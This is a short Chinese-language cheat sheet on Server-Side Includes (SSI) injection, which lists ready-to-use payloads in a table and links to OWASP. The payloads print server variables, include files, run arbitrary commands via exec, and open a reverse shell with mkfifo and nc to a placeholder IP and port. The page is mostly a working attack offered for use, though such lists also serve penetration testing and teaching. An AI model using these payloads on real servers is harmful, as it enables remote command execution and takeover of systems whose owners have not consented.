# 服务器端包含注入

> 服务器端包含（SSI）是在HTML页面中放置的指令，在页面被服务时由服务器评估。它们允许您在现有的HTML页面中添加动态生成的内容，而无需通过CGI程序或其他动态技术来提供整个页面。


## 摘要

* [有效载荷](#payloads)
* [参考资料](#references)


## 有效载荷

| 描述          | 有效载荷                                                     |
| ------------- | ------------------------------------------------------------ |
| 打印日期      | `<!--#echo var="DATE_LOCAL" -->`                             |
| 打印所有变量  | `<!--#printenv -->`                                          |
| 包含一个文件  | `<!--#include file="includefile.html" -->`                   |
| 执行命令      | `<!--#exec cmd="ls" -->`                                     |
| 进行反向shell | `<!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->` |


## 参考资料

* [服务器端包含（SSI）注入 - OWASP](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)